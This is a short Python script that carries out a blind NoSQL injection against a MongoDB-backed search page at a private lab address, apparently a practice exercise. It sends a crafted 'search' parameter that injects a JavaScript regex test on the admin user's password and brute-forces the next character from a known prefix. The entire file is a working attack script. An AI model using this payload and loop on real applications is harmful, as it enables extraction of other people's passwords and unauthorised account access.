#!/usr/local/bin/python

import sys
import requests
import base64
import string

#print "First argument is " + str(sys.argv[1])

url = 'http://172.20.0.101/mongodb/example2/'

charseq = list(string.ascii_lowercase + "0123456789")
for char in charseq:
    #max_exec_time = 0
    suggested_char = "a"
    req_string = "?search=admin'%20%26%26%20this.password.match(/^icanhazpassw0rd" + char + ".*$/)//+%00"
    #hdrs = {"Encoding": "gzip, deflate", "Authorization": auth_string}
    r = requests.get(url + req_string)
    #exec_time = r.elapsed.total_seconds()
    print "Char: " + char
    print r.text
    #if exec_time > max_exec_time:
    #    suggested_char = char
    #if r.status_code != 401
    #    print r.status_code
    #    break

#print suggested_char
#print resp.read()
